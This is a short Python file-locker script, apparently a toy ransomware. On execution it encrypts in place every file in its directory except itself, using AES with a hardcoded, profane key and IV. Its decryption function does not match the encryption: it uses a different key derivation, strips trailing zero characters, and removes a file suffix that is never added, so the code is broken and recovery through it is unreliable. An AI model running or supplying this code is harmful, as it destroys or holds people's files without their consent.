import os, base64, hashlib
from Crypto.Cipher import AES

pasw = 'what tf fuckyou_6969##34'

def balancer_(data):
	while len(data)%16 !=0:
		data+=b"0"
	return data


def enc(fn):
	try:
		obj = AES.new(pasw, AES.MODE_CBC, 'This is anFucker')
		with open(fn,'rb') as rlf:
			data = rlf.read()
		balanced_data = balancer_(data)
		ciphertext = obj.encrypt(balanced_data)
		f = open(fn,'rb+')
		f.write(ciphertext)
		f.close()
		print('[Success]\n==================')
	except:
		print('[Failed]\n==================')


def dec(fn):
	try:
		ui = input('Enter password: ').encode()
		pasw = hashlib.sha256(ui).hexdigest()
		with open(fn,'rb') as lf:
			encf = lf.read()
		obj2 = AES.new(pasw, AES.MODE_CBC, 'This is anFucker')
		x=obj2.decrypt(encf)
		with open(fn,'wb') as fw:
			fw.write(x.rstrip(b'0'))
			fw.close()
		try:
			realname = fn.replace('.ninja','')
			os.rename(fn, realname)
		except:
			pass
		print('[Success]\n==================')
	except:
		print('[Failed]\n==================')

file = os.listdir()
for f_name in file:
	if os.path.isfile(f_name):
		if f_name == os.path.basename(__file__):
			pass
		else:
			print('Locking: '+f_name)
			enc(f_name)
